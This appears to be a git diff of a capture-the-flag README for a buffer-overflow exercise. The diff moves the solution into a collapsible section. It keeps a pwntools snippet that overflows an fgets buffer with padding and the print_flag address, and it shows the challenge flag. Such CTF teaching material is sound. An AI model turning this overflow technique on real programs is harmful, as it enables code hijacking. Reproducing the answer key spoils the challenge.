@@ -2,7 +2,17 @@
 ### 📄 Description
 Can you retrieve the flag?
 
-## 🔑 Solution
+### ⚙ How to run it
+```bash
+./hi
+```
+
+
+<details>
+    <summary>
+        <h2>🔑 Solution</h2>
+    </summary>
+
 It's the same as the previous exercise, it uses `fgets` instead of gets but the provided character limit is incorrect (it should be 32).
 
 ```python
@@ -15,7 +25,9 @@ p.sendline(b"A" * 32 + b"a" * 8 + p64(context.binary.functions["print_flag"].add
 log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
 ```
 
-### 🚩 Flag
+<h3> 🚩 Flag </h3>
+
 ```plain
 ccit{hi_i_am_a_flag}
 ```
+</details>
